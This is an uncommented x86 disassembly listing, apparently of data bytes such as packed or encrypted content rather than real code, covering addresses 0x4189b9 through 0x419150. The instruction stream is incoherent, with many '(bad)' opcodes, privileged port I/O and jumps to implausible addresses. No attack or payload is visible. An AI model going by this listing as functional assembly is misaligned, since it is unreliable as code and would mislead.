  4189b9:	outs   dx,DWORD PTR ds:[esi]
  4189ba:	dec    ebx
  4189bb:	push   edx
  4189bc:	stc    
  4189bd:	cmp    ah,BYTE PTR [ebx-0x73ef4f90]
  4189c3:	shl    BYTE PTR [edx+0x3a],cl
  4189c6:	push   es
  4189c7:	and    eax,0xb297bcee
  4189cc:	loop   0x4189c9
  4189ce:	jnp    0x418a48
  4189d0:	loope  0x418966
  4189d2:	iret   
  4189d3:	je     0x418a13
  4189d5:	dec    esi
  4189d6:	mov    ds:0x3ccfcbd1,al
  4189db:	and    al,0xd9
  4189dd:	or     esi,esi
  4189df:	push   esi
  4189e0:	rcl    eax,cl
  4189e2:	and    esp,DWORD PTR [edi]
  4189e4:	inc    eax
  4189e5:	shl    DWORD PTR [esi-0x10],1
  4189e8:	mov    ecx,0x503a3b09
  4189ed:	cli    
  4189ee:	jno    0x418a48
  4189f0:	fstp   TBYTE PTR [esi+0x5400f40]
  4189f6:	mov    ecx,0xa28842ba
  4189fb:	leave  
  4189fc:	push   esi
  4189fd:	test   eax,0xa816561a
  418a02:	xchg   ecx,eax
  418a03:	mov    ah,0x1b
  418a05:	mov    ds:0xcdd1bd74,al
  418a0a:	xchg   DWORD PTR ds:0x6155780d,esp
  418a10:	inc    ebp
  418a11:	sub    bl,BYTE PTR [ebx-0x7941e6f6]
  418a17:	xor    dh,bh
  418a19:	imul   edx,DWORD PTR [ecx-0x53],0x6a
  418a1d:	sbb    al,0x82
  418a1f:	mov    gs,WORD PTR ds:0x831d1cb2
  418a25:	inc    edx
  418a26:	js     0x4189ef
  418a28:	mov    al,ds:0xe8e998a
  418a2d:	aam    0x67
  418a2f:	ins    DWORD PTR es:[edi],dx
  418a30:	fild   DWORD PTR [ecx]
  418a32:	fild   WORD PTR [edx]
  418a34:	push   edx
  418a35:	(bad)  
  418a36:	xchg   edi,eax
  418a37:	mov    al,ds:0xe1083c35
  418a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a3d:	mov    dh,0x7f
  418a3f:	add    eax,0xdbd2e44d
  418a44:	jmp    0x196c41e2
  418a49:	jno    0x4189f1
  418a4b:	pop    edi
  418a4c:	mov    dl,BYTE PTR [esi-0x47]
  418a4f:	lods   eax,DWORD PTR ds:[esi]
  418a50:	jp     0x418a8c
  418a52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a53:	mov    esi,ds
  418a55:	sub    ecx,DWORD PTR [ecx]
  418a57:	repz pop ecx
  418a59:	xchg   edx,eax
  418a5a:	dec    ecx
  418a5b:	mov    al,ds:0x178ad68e
  418a60:	jle    0x4189e8
  418a62:	out    dx,al
  418a63:	pushf  
  418a64:	sub    BYTE PTR [eax],dl
  418a66:	adc    DWORD PTR [esi],edi
  418a68:	out    dx,al
  418a69:	add    eax,0x1dd536de
  418a6e:	sub    eax,0x9abd1201
  418a74:	out    0xc2,eax
  418a76:	std    
  418a77:	jmp    0x4a9987d9
  418a7c:	add    dl,bl
  418a7e:	lahf   
  418a7f:	and    ebp,DWORD PTR [esi]
  418a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a82:	cld    
  418a83:	xchg   ebp,eax
  418a84:	fnstsw WORD PTR [esi]
  418a86:	inc    edi
  418a87:	and    DWORD PTR [edx-0x22],edi
  418a8a:	add    ebp,0xb19916c7
  418a90:	mov    cl,0x33
  418a92:	pop    es
  418a93:	je     0x418a8f
  418a95:	jmp    0x9daae676
  418a9a:	jbe    0x418b05
  418a9c:	adc    al,0x4b
  418a9e:	hlt    
  418a9f:	lods   al,BYTE PTR ds:[esi]
  418aa0:	cmc    
  418aa1:	in     al,dx
  418aa2:	xchg   ecx,eax
  418aa3:	mov    cl,dl
  418aa5:	in     eax,dx
  418aa6:	retf   0xddc6
  418aa9:	push   edi
  418aaa:	or     BYTE PTR [edx+0x606c8fdd],bh
  418ab0:	shl    DWORD PTR [esi],cl
  418ab2:	lock test DWORD PTR [edx+0x2a],0xd756d677
  418aba:	xchg   edi,eax
  418abb:	inc    esi
  418abc:	shr    DWORD PTR [edx],0xa8
  418abf:	and    al,0xe9
  418ac1:	cmp    ebp,DWORD PTR [edi+0x7bfb63d]
  418ac7:	add    ch,BYTE PTR [ecx+0x77]
  418aca:	mov    eax,ds:0xe32a4207
  418acf:	pop    ecx
  418ad0:	xchg   ecx,eax
  418ad1:	push   ebp
  418ad2:	xor    esi,DWORD PTR cs:[ecx]
  418ad5:	retf   
  418ad6:	stos   DWORD PTR es:[edi],eax
  418ad7:	dec    ebx
  418ad8:	scas   eax,DWORD PTR es:[edi]
  418ad9:	sbb    BYTE PTR [eax],bh
  418adb:	pop    ebp
  418adc:	popaw  
  418ade:	and    ebp,DWORD PTR [ebp-0x7a]
  418ae1:	dec    esp
  418ae2:	mov    al,ds:0x87743297
  418ae7:	mov    ds:0xcba0e08d,eax
  418aec:	addr16 xor ch,al
  418aef:	dec    eax
  418af0:	and    DWORD PTR [edx+0x58bc13fb],esi
  418af6:	dec    eax
  418af7:	mov    esp,0x1995898f
  418afc:	int    0xa8
  418afe:	ret    
  418aff:	test   al,0x62
  418b01:	js     0x418a92
  418b03:	cmp    BYTE PTR [ebx],0x6b
  418b06:	push   ss
  418b07:	cmp    al,BYTE PTR [eax+ebx*8-0x73b430fb]
  418b0e:	loop   0x418b5f
  418b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b11:	push   cs
  418b12:	int    0xc7
  418b14:	iret   
  418b15:	int3   
  418b16:	sbb    esi,eax
  418b18:	out    0x60,eax
  418b1a:	cmp    ebx,DWORD PTR [ecx]
  418b1c:	sbb    al,0x24
  418b1e:	test   ecx,ecx
  418b20:	fbstp  TBYTE PTR [ebx+0x3f47515c]
  418b26:	sbb    eax,0xc6fcb4c3
  418b2b:	test   esp,ebx
  418b2d:	pop    esp
  418b2e:	cmp    edi,eax
  418b30:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  418b32:	aad    0x3
  418b34:	pop    eax
  418b35:	mov    ebp,0xde10b0d0
  418b3a:	push   esp
  418b3b:	mov    edx,0x3123f0c9
  418b40:	pop    esi
  418b41:	(bad)  
  418b42:	jbe    0x418aea
  418b44:	adc    dh,BYTE PTR [eax+0x74]
  418b47:	adc    al,0x62
  418b49:	cmp    al,ah
  418b4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b4c:	nop
  418b4d:	stos   DWORD PTR es:[edi],eax
  418b4e:	rol    BYTE PTR [eax+ecx*2-0x754e29e4],0x33
  418b56:	das    
  418b57:	dec    DWORD PTR [ebx-0x76]
  418b5a:	push   edi
  418b5b:	pop    ebp
  418b5c:	arpl   WORD PTR [ecx+ebp*2+0x7e686d83],si
  418b63:	daa    
  418b64:	fisub  DWORD PTR [ebp+0x6b]
  418b67:	jmp    0x88ff:0xeab278bb
  418b6e:	sbb    DWORD PTR [eax],ecx
  418b70:	jnp    0x418bc0
  418b72:	adc    dl,BYTE PTR ds:0xffe86070
  418b78:	mov    edx,0xbe510d2
  418b7d:	ja     0x418b6b
  418b7f:	fs push edi
  418b81:	fild   WORD PTR [ebx-0x36]
  418b84:	jns    0x418b12
  418b86:	or     al,0xbe
  418b88:	push   cs
  418b89:	adc    ecx,esi
  418b8b:	or     edi,DWORD PTR [edi-0xe]
  418b8e:	fdiv   st,st(2)
  418b90:	inc    esi
  418b91:	aaa    
  418b92:	cmp    ecx,DWORD PTR [eax]
  418b94:	ins    DWORD PTR es:[edi],dx
  418b95:	test   eax,0xfd8f9f4a
  418b9a:	aas    
  418b9b:	ja     0x418b86
  418b9d:	push   ebx
  418b9e:	fisub  DWORD PTR [esp+ebx*8+0x5]
  418ba2:	sub    ah,BYTE PTR [ebp-0x54cb6d0a]
  418ba8:	sub    esp,DWORD PTR [eax-0x1cdec303]
  418bae:	daa    
  418baf:	(bad)  
  418bb0:	fld    DWORD PTR [eax+0x24251c86]
  418bb6:	ins    DWORD PTR es:[edi],dx
  418bb7:	out    dx,eax
  418bb8:	jmp    0x418b56
  418bba:	mov    bh,0x91
  418bbc:	fmulp  st(5),st
  418bbe:	push   ss
  418bbf:	sbb    eax,0xaafd145f
  418bc4:	sub    eax,0x4f729583
  418bc9:	std    
  418bca:	and    bh,ah
  418bcc:	push   ebx
  418bcd:	dec    edx
  418bce:	(bad)  
  418bcf:	nop
  418bd0:	mov    ds:0x26eafe09,eax
  418bd5:	daa    
  418bd6:	lock popa 
  418bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bd9:	push   edx
  418bda:	das    
  418bdb:	and    al,0xdc
  418bdd:	push   edi
  418bde:	rcl    ecx,cl
  418be0:	mov    al,0xbc
  418be2:	jae    0x418b9a
  418be4:	jno    0x418bd6
  418be6:	push   cs
  418be7:	aas    
  418be8:	sti    
  418be9:	mov    ebp,0xb1efef57
  418bee:	jmp    0xa3c2:0xa56b3df2
  418bf5:	scas   al,BYTE PTR es:[edi]
  418bf6:	inc    edx
  418bf7:	mov    esp,?
  418bf9:	ret    
  418bfa:	shl    DWORD PTR [edx],cl
  418bfc:	push   ds
  418bfd:	ins    BYTE PTR es:[edi],dx
  418bfe:	dec    ebx
  418bff:	pop    ebp
  418c00:	inc    esi
  418c01:	pop    ebp
  418c02:	push   ecx
  418c03:	push   ss
  418c04:	sbb    BYTE PTR [edi+0x61ea34fa],bh
  418c0a:	daa    
  418c0b:	xchg   edx,eax
  418c0c:	cs call 0x7e19ba27
  418c12:	cmp    BYTE PTR [ecx-0x6a],ah
  418c15:	fild   DWORD PTR [esi+0x2296e930]
  418c1b:	push   edx
  418c1c:	pushf  
  418c1d:	mov    bl,0xfb
  418c1f:	daa    
  418c20:	sbb    bl,BYTE PTR [ebx-0x11f6d503]
  418c26:	ins    BYTE PTR es:[edi],dx
  418c27:	loope  0x418bae
  418c29:	jb     0x418c26
  418c2b:	iret   
  418c2c:	daa    
  418c2d:	fcom   QWORD PTR [ebx]
  418c2f:	add    DWORD PTR [ecx+0x22],eax
  418c32:	push   ebp
  418c33:	mov    bh,0x8c
  418c35:	pop    si
  418c37:	ds ret 0x538d
  418c3b:	mov    al,BYTE PTR ds:0x13bfdd5f
  418c41:	(bad)  
  418c42:	pop    ebp
  418c43:	nop
  418c44:	add    eax,0x964ad2e7
  418c49:	leave  
  418c4a:	lock test eax,0x3da42144
  418c50:	dec    eax
  418c51:	out    dx,eax
  418c52:	gs or  eax,0x25435a73
  418c58:	test   BYTE PTR [edx],ch
  418c5a:	xlat   BYTE PTR ds:[ebx]
  418c5b:	in     al,0x8a
  418c5d:	jg     0x418cad
  418c5f:	cld    
  418c60:	mov    dh,0x43
  418c62:	sbb    ah,BYTE PTR [edx]
  418c64:	cld    
  418c65:	jae    0x418c48
  418c67:	cmp    BYTE PTR [edi],0xab
  418c6a:	out    0x36,eax
  418c6c:	popf   
  418c6d:	or     eax,0x162d0b75
  418c72:	adc    al,0x14
  418c74:	aaa    
  418c75:	(bad)  
  418c76:	and    esi,edi
  418c78:	cwde   
  418c79:	and    DWORD PTR [edi+ecx*2+0x3e],ebx
  418c7d:	xor    al,dh
  418c7f:	sub    BYTE PTR [edx-0x518428c2],bl
  418c85:	mov    edi,0xa35f757b
  418c8a:	pop    eax
  418c8b:	test   BYTE PTR [ecx-0x7478cdea],ah
  418c91:	xor    ecx,DWORD PTR [ebx-0x27]
  418c94:	sbb    cl,BYTE PTR [ecx-0x1261e5c1]
  418c9a:	sbb    DWORD PTR [ebx],ebp
  418c9c:	jns    0x418c44
  418c9e:	add    DWORD PTR [ebx+0x36],0x48125bf9
  418ca5:	fs push esp
  418ca7:	adc    eax,0x2f3ea9b9
  418cac:	scas   eax,DWORD PTR es:[edi]
  418cad:	outs   dx,DWORD PTR ds:[esi]
  418cae:	add    al,0xb0
  418cb0:	ds sbb al,0x8e
  418cb3:	daa    
  418cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cb5:	adc    BYTE PTR [esi+0x71],ah
  418cb8:	xor    ah,BYTE PTR [edi-0x4a8b8517]
  418cbe:	jecxz  0x418ca8
  418cc0:	or     DWORD PTR [eax],edi
  418cc2:	sbb    BYTE PTR [ebp-0x5f],dh
  418cc5:	nop
  418cc6:	(bad)  
  418cc7:	push   ds
  418cc8:	pushf  
  418cc9:	xor    edi,esp
  418ccb:	or     al,0xe4
  418ccd:	fs scas al,BYTE PTR es:[edi]
  418ccf:	(bad)  
  418cd0:	dec    esp
  418cd1:	dec    ebp
  418cd2:	adc    eax,0x8081b6dc
  418cd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cd8:	retf   0x46c0
  418cdb:	jp     0x418ce7
  418cdd:	out    0xf2,eax
  418cdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ce0:	and    ch,dl
  418ce2:	mov    al,ds:0xab7f1b55
  418ce7:	inc    edi
  418ce8:	and    al,0x96
  418cea:	mov    dl,0x26
  418cec:	jbe    0x418d1b
  418cee:	inc    ebx
  418cef:	push   0xee9efa62
  418cf4:	adc    DWORD PTR [edi],ecx
  418cf6:	pop    ebp
  418cf7:	jb     0x418cfd
  418cf9:	(bad)  
  418cfa:	scas   eax,DWORD PTR es:[edi]
  418cfb:	pop    edx
  418cfc:	adc    al,0x23
  418cfe:	jbe    0x418d3a
  418d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d01:	and    DWORD PTR [edx+0x19],ecx
  418d04:	ret    
  418d05:	dec    eax
  418d06:	xchg   edx,eax
  418d07:	xchg   edx,eax
  418d08:	push   esp
  418d09:	and    BYTE PTR [edx+0x6b],bl
  418d0c:	dec    edi
  418d0d:	mov    cl,0x49
  418d0f:	cdq    
  418d10:	sbb    al,0x66
  418d12:	out    dx,eax
  418d13:	sbb    eax,0x9baab81e
  418d18:	(bad)  
  418d19:	lahf   
  418d1a:	out    dx,eax
  418d1b:	imul   eax,DWORD PTR ds:0x2065590d,0x5b
  418d22:	mov    eax,0x3382e186
  418d27:	test   al,0x78
  418d29:	push   ds
  418d2a:	mov    al,ds:0xd83c9f04
  418d2f:	mov    bh,0x31
  418d31:	inc    edi
  418d32:	fbld   TBYTE PTR [eax-0x497bd8ba]
  418d38:	jnp    0x418d7e
  418d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d3b:	(bad)  
  418d3c:	mov    edx,0x3cfa7c6c
  418d41:	add    DWORD PTR [ecx+0x11],ebx
  418d44:	rcr    BYTE PTR [ebp+0x783e6f92],cl
  418d4a:	stos   BYTE PTR es:[edi],al
  418d4b:	(bad)  
  418d4c:	mov    ah,BYTE PTR [ebx-0x5d9d4719]
  418d52:	or     al,BYTE PTR [esi+0x5adaa156]
  418d58:	xor    eax,0x7f2430b3
  418d5d:	jo     0x418dd8
  418d5f:	(bad)  
  418d61:	nop
  418d62:	repnz dec ecx
  418d64:	pop    ss
  418d65:	(bad)
  418d68:	dec    edx
  418d69:	or     al,0xd
  418d6b:	pop    ss
  418d6c:	into   
  418d6d:	fbld   TBYTE PTR [edi+0x6b]
  418d70:	jecxz  0x418d5b
  418d72:	or     al,0x65
  418d74:	sti    
  418d75:	sub    DWORD PTR [edi-0x15],eax
  418d78:	rol    BYTE PTR [eax+0x8d78367],0x3d
  418d7f:	xor    DWORD PTR [edi],esp
  418d81:	in     al,0x91
  418d83:	loope  0x418dc6
  418d85:	mov    al,0x4e
  418d87:	dec    ebp
  418d88:	daa    
  418d89:	sub    ecx,edi
  418d8b:	ror    BYTE PTR [ebx+0x3d30faf9],0x81
  418d92:	ficom  WORD PTR [esi-0x51d09b85]
  418d98:	stc    
  418d99:	inc    eax
  418d9a:	retf   
  418d9b:	out    dx,eax
  418d9c:	or     DWORD PTR [esi+ebp*4+0x14625359],esp
  418da3:	into   
  418da4:	in     al,0xf9
  418da6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418da7:	mov    ds:0xd3aa657e,al
  418dac:	sbb    eax,0xc4e68c6b
  418db1:	push   ecx
  418db2:	daa    
  418db3:	scas   al,BYTE PTR es:[edi]
  418db4:	push   esi
  418db5:	cwde   
  418db6:	jg     0x418d9c
  418db8:	mov    ebp,0xb103ca51
  418dbd:	fst    QWORD PTR [edi+0x5]
  418dc0:	mov    esi,0xc1664ab9
  418dc5:	(bad)  
  418dc6:	mov    dl,0x6e
  418dc8:	push   ds
  418dc9:	aad    0x36
  418dcb:	ret    0x2039
  418dce:	(bad)  
  418dcf:	and    al,0x30
  418dd1:	jle    0x418e2d
  418dd3:	jmp    0x418dd2
  418dd5:	aaa    
  418dd6:	mov    dh,0x56
  418dd8:	mov    bl,0x2d
  418dda:	and    edx,esp
  418ddc:	icebp  
  418ddd:	mov    esp,0xd9a74438
  418de2:	rcr    ah,cl
  418de4:	out    0xe5,al
  418de6:	cli    
  418de7:	cmp    eax,0xc767b443
  418dec:	mov    edx,0xce14bfa4
  418df1:	xor    al,0x4b
  418df3:	push   edi
  418df4:	imul   esi,ebx,0x84a6a150
  418dfa:	cmp    dh,0x74
  418dfd:	add    al,0x1e
  418dff:	pop    ebx
  418e00:	mov    ds:0xa1e26497,al
  418e05:	xor    DWORD PTR [edi],edx
  418e07:	cmp    eax,0x26fd7a18
  418e0c:	dec    ebp
  418e0d:	nop
  418e0e:	cmp    BYTE PTR [ebx+0x76],al
  418e11:	out    0xb1,al
  418e13:	dec    ebx
  418e14:	hlt    
  418e15:	sub    DWORD PTR [ecx+0x2074480a],ebp
  418e1b:	inc    eax
  418e1c:	inc    edi
  418e1d:	mov    bh,0xe3
  418e1f:	inc    edi
  418e20:	xor    eax,edx
  418e22:	add    dh,ah
  418e24:	cmp    BYTE PTR [edi+0x2e],0x60
  418e28:	aam    0xaa
  418e2a:	sub    eax,0x4fa04957
  418e2f:	mov    ds:0x9979f550,al
  418e34:	jo     0x418e43
  418e36:	jne    0x418e9c
  418e38:	aad    0xe6
  418e3a:	xor    DWORD PTR [esi-0x71],eax
  418e3d:	xchg   esp,eax
  418e3e:	push   es
  418e3f:	jp     0x418dfd
  418e41:	rol    DWORD PTR [esp+edi*8-0x51],1
  418e45:	retf   
  418e46:	ins    DWORD PTR es:[edi],dx
  418e47:	ror    DWORD PTR ds:[ebx],1
  418e4a:	push   ds
  418e4b:	pop    ds
  418e4c:	or     dh,BYTE PTR [eax+0x2232b5f5]
  418e52:	stc    
  418e53:	mov    al,ds:0xedae62cb
  418e58:	int    0x7c
  418e5a:	cld    
  418e5b:	out    0x54,al
  418e5d:	cmp    dl,ah
  418e5f:	jbe    0x418ed9
  418e61:	stc    
  418e62:	mul    BYTE PTR [ecx]
  418e64:	stos   BYTE PTR es:[edi],al
  418e65:	sub    ch,dh
  418e67:	mov    ecx,0x17a00bde
  418e6c:	push   esi
  418e6d:	inc    ecx
  418e6e:	dec    esi
  418e6f:	or     DWORD PTR [edi],esp
  418e71:	mov    dl,BYTE PTR [eax-0x1b19d21a]
  418e77:	call   0xf8f1:0xe0f5882a
  418e7e:	daa    
  418e7f:	mov    cl,0x11
  418e81:	sub    al,0x29
  418e83:	adc    eax,0x7e294bbc
  418e88:	ror    bl,cl
  418e8a:	add    al,0xb5
  418e8c:	in     al,0xe2
  418e8e:	mov    es:0x9f736c8a,al
  418e94:	icebp  
  418e95:	inc    ebx
  418e96:	jae    0x418e30
  418e98:	or     al,0x5f
  418e9a:	adc    bh,BYTE PTR [ebx+0x77]
  418e9d:	repz mov edx,DWORD PTR ds:[ecx]
  418ea1:	inc    eax
  418ea2:	shl    DWORD PTR [eax+0x28aa2849],1
  418ea8:	sub    DWORD PTR [edx],edi
  418eaa:	retf   
  418eab:	jno    0x418ef4
  418ead:	lea    edi,[eax+eiz*2]
  418eb0:	adc    al,bl
  418eb2:	dec    esp
  418eb3:	cmp    al,0x1c
  418eb5:	xor    ebp,esp
  418eb7:	adc    eax,0x3e5bc224
  418ebc:	add    al,0x5
  418ebe:	div    BYTE PTR [ecx]
  418ec0:	sub    cl,0xb
  418ec3:	lods   eax,DWORD PTR ds:[esi]
  418ec4:	(bad)  
  418ec5:	repz test eax,0x6aa79af7
  418ecb:	inc    edi
  418ecc:	ins    BYTE PTR es:[edi],dx
  418ecd:	xchg   ebx,eax
  418ece:	popf   
  418ecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ed0:	cld    
  418ed1:	add    edi,DWORD PTR [edi+0x313a7ace]
  418ed7:	push   edi
  418ed8:	pop    ebp
  418ed9:	sub    DWORD PTR [eax+0x30921023],edi
  418edf:	pop    eax
  418ee0:	ss std 
  418ee2:	xor    esp,DWORD PTR ds:0xac51d4ce
  418ee8:	out    dx,al
  418ee9:	sub    eax,ebx
  418eeb:	fimul  DWORD PTR [esi+0x4b1bc7be]
  418ef1:	mov    edi,0x6e7f0897
  418ef6:	mov    ebp,0x3512f41
  418efb:	mov    edx,0x7e612a1b
  418f00:	lds    ecx,FWORD PTR [ebx]
  418f02:	pop    ebp
  418f03:	xchg   esp,eax
  418f04:	mov    dl,0xd8
  418f06:	fcmovnu st,st(3)
  418f08:	fsubr  QWORD PTR [ebx]
  418f0a:	clc    
  418f0b:	and    edi,ecx
  418f0d:	scas   al,BYTE PTR es:[edi]
  418f0e:	or     ebp,DWORD PTR [edx]
  418f10:	and    ecx,DWORD PTR [ecx-0x1b]
  418f13:	test   DWORD PTR [eax],0x7e660165
  418f19:	push   ebp
  418f1a:	fbstp  TBYTE PTR [ecx+0x33d761f]
  418f20:	inc    ebp
  418f21:	cwde   
  418f22:	in     eax,dx
  418f23:	cmp    al,BYTE PTR ds:[ecx+ebp*8]
  418f27:	mul    BYTE PTR [edx+0x60]
  418f2a:	sub    esi,ecx
  418f2c:	jb     0x418f75
  418f2e:	mov    al,0xef
  418f30:	pop    ebx
  418f31:	sahf   
  418f32:	sar    DWORD PTR [edi],1
  418f34:	xor    ebx,ebx
  418f36:	mov    bl,0x34
  418f38:	mov    ecx,0x952b8937
  418f3d:	cli    
  418f3e:	mov    esp,0xbcbcc938
  418f43:	dec    esp
  418f44:	rcl    BYTE PTR ds:0x1a423b87,cl
  418f4a:	jnp    0x418f1e
  418f4c:	adc    eax,0xf0ddd4e4
  418f51:	push   esp
  418f52:	jmp    0x418f65
  418f54:	in     eax,dx
  418f55:	and    al,0x75
  418f57:	loope  0x418f89
  418f59:	data16 daa 
  418f5b:	jmp    0x41dabcab
  418f60:	dec    esi
  418f61:	outs   dx,DWORD PTR ds:[esi]
  418f62:	jmp    0xaac2:0x737f85c0
  418f69:	das    
  418f6a:	jne    0x418f8c
  418f6c:	pop    ds
  418f6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f6f:	aas    
  418f70:	outs   dx,BYTE PTR ds:[esi]
  418f71:	cmp    BYTE PTR [esi-0x5edbb119],bh
  418f77:	scas   eax,DWORD PTR es:[edi]
  418f78:	mov    cl,0x2d
  418f7a:	pop    ds
  418f7b:	xchg   esi,eax
  418f7c:	(bad)  
  418f7d:	fadd   DWORD PTR [edi-0x68b68973]
  418f83:	xor    eax,0xb4aa2d83
  418f88:	adc    BYTE PTR [ebx+0x2d],0x3e
  418f8c:	int3   
  418f8d:	push   cs
  418f8e:	mov    esi,0xea4d7b9b
  418f93:	dec    ebp
  418f94:	jg     0x418f59
  418f96:	xchg   ebx,eax
  418f97:	(bad)  
  418f98:	mov    ch,0x6d
  418f9a:	add    eax,0x56c4f9c4
  418f9f:	xor    al,0xbb
  418fa1:	imul   ebx,DWORD PTR [edx-0x27bd42fe],0xffffffb5
  418fa8:	lahf   
  418fa9:	mov    dl,0x35
  418fab:	add    eax,DWORD PTR [eax+ebx*8-0x27]
  418faf:	mov    al,0xc0
  418fb1:	pop    eax
  418fb2:	xor    ah,BYTE PTR [edx]
  418fb4:	xchg   ebx,eax
  418fb5:	pop    eax
  418fb6:	add    al,0x3b
  418fb8:	popf   
  418fb9:	rcr    DWORD PTR [esi-0x20381d78],1
  418fbf:	jl     0x41903b
  418fc1:	push   ss
  418fc2:	adc    DWORD PTR [edx],esp
  418fc4:	adc    ch,0x4b
  418fc7:	les    esi,FWORD PTR [edx-0x52]
  418fca:	sbb    BYTE PTR [edi],0x3a
  418fcd:	mov    cl,0x1d
  418fcf:	mov    esi,0x83de3828
  418fd4:	aaa    
  418fd5:	mov    DWORD PTR [eax+0x3d],ebp
  418fd8:	cdq    
  418fd9:	mov    edx,0xe510b479
  418fde:	call   0xcd7b:0xb7d56e63
  418fe5:	test   al,0xd3
  418fe7:	lahf   
  418fe8:	les    esi,FWORD PTR ds:0x159bf29
  418fee:	xor    DWORD PTR [eax],ebp
  418ff0:	adc    eax,0xb1debef4
  418ff5:	std    
  418ff6:	adc    al,0xc7
  418ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ff9:	sub    DWORD PTR [esi+0x6513b68f],edx
  418fff:	xor    edx,DWORD PTR [eax+0x790ab0c7]
  419005:	cmp    edx,ebp
  419007:	push   es
  419008:	ins    DWORD PTR es:[edi],dx
  419009:	test   eax,0x9503a767
  41900e:	mov    bl,0x76
  419010:	mov    es,WORD PTR [edx]
  419012:	or     DWORD PTR [ebx-0x1b6afb07],ecx
  419018:	retf   0xb351
  41901b:	data16 (bad) 
  41901d:	ins    BYTE PTR es:[edi],dx
  41901e:	inc    esp
  41901f:	fistp  QWORD PTR [ecx+ecx*2+0x3f]
  419023:	cdq    
  419024:	data16 sub BYTE PTR [ecx-0x6debcf12],bh
  41902b:	jo     0x419003
  41902d:	repz scas eax,DWORD PTR es:[edi]
  41902f:	fld    TBYTE PTR [eax-0x13777049]
  419035:	and    ch,BYTE PTR [edx]
  419037:	outs   dx,DWORD PTR ds:[esi]
  419038:	xor    bh,BYTE PTR [ebp*4-0x5b109fa7]
  41903f:	retf   
  419040:	cmp    eax,DWORD PTR [eax]
  419042:	cmp    ebx,DWORD PTR [eax+edi*8]
  419045:	js     0x418fee
  419047:	push   ds
  419048:	int    0xbb
  41904a:	fidiv  DWORD PTR [edx+0x210227cf]
  419050:	lahf   
  419051:	lds    eax,FWORD PTR [ebp-0x5]
  419054:	jmp    0x44e7c6e4
  419059:	loopne 0x4190c6
  41905b:	push   es
  41905c:	sbb    eax,0x8e9add51
  419061:	lahf   
  419062:	sbb    eax,DWORD PTR [ebx+0x17]
  419065:	retf   
  419066:	add    bl,bh
  419068:	aas    
  419069:	inc    edx
  41906a:	retf   
  41906b:	loopne 0x4190a9
  41906d:	or     DWORD PTR [eax+0x1bb0dbaf],edi
  419073:	ins    BYTE PTR es:[edi],dx
  419074:	lods   eax,DWORD PTR ds:[esi]
  419075:	bound  edx,QWORD PTR [edi]
  419077:	sbb    eax,0x94f9d81b
  41907c:	sbb    edx,ecx
  41907e:	pop    ebx
  41907f:	dec    esi
  419080:	push   eax
  419081:	or     eax,0x95dcb878
  419086:	ret    
  419087:	ss in  eax,0xdf
  41908a:	mov    BYTE PTR [ecx],al
  41908c:	cmp    dh,BYTE PTR [esi+eax*8-0x4d76b764]
  419093:	mov    ebx,0x3bc26ff5
  419098:	shl    dh,cl
  41909a:	fiadd  DWORD PTR [edi-0xb]
  41909d:	pusha  
  41909e:	test   eax,0x5bc2c70d
  4190a3:	jmp    0x423f1588
  4190a8:	push   0x3d
  4190aa:	add    DWORD PTR [ebx+0x17],ebp
  4190ad:	lock fisub DWORD PTR [edi+0x5d68ca3]
  4190b4:	pop    bx
  4190b6:	sbb    DWORD PTR [ecx],0xffffff96
  4190b9:	(bad)  
  4190ba:	xor    eax,0xadeb7b2f
  4190bf:	cmp    eax,DWORD PTR [eax+0x4bf9fddb]
  4190c5:	sbb    al,0xbb
  4190c7:	jle    0x419125
  4190c9:	jg     0x419064
  4190cb:	add    dl,ah
  4190cd:	popf   
  4190ce:	adc    esp,ebx
  4190d0:	(bad)  
  4190d1:	fsubr  QWORD PTR [esi]
  4190d3:	aaa    
  4190d4:	cmp    esp,DWORD PTR [eax]
  4190d6:	mov    edx,0x7137bfd8
  4190db:	scas   al,BYTE PTR es:[edi]
  4190dc:	sbb    DWORD PTR [ebp+0x3662b5ec],ebp
  4190e2:	sbb    ch,dh
  4190e4:	sub    eax,0x75c09c03
  4190e9:	pushf  
  4190ea:	sub    ah,BYTE PTR [edi]
  4190ec:	xchg   esi,eax
  4190ed:	sub    ecx,ebx
  4190ef:	sub    eax,0x6df2314f
  4190f4:	xchg   ebp,eax
  4190f5:	lea    ebx,[ebp-0x3021e94f]
  4190fb:	lods   eax,DWORD PTR ds:[esi]
  4190fc:	mov    al,ds:0x5059489a
  419101:	packuswb mm7,QWORD PTR [edx]
  419104:	lock popf 
  419106:	lock cli 
  419108:	xchg   ebp,eax
  419109:	sub    al,0x18
  41910b:	or     esi,ebp
  41910d:	into   
  41910e:	jbe    0x419122
  419110:	cwde   
  419111:	push   0x360c793
  419116:	lock inc ebp
  419118:	dec    edi
  419119:	xchg   BYTE PTR [ebx-0x78],cl
  41911c:	mov    ds:0xc984c90b,al
  419121:	lds    esi,FWORD PTR [edx]
  419123:	and    eax,0xe9d0072
  419128:	xor    ecx,DWORD PTR [esi-0x4ba3eb1a]
  41912e:	add    ecx,DWORD PTR [edi+0x1e]
  419131:	dec    esi
  419132:	mov    BYTE PTR [ebp-0x3b6cf96e],ch
  419138:	pop    edx
  419139:	(bad)  
  41913a:	jo     0x4191b7
  41913c:	mov    ch,0xb5
  41913e:	rol    ah,0x16
  419141:	sub    ch,BYTE PTR [ebp+0x74e8364f]
  419147:	shr    DWORD PTR [ebp-0x65cd2e60],0x70
  41914e:	xchg   BYTE PTR [esi],bh
  419150:	cmp    eax,0x43dc82e3
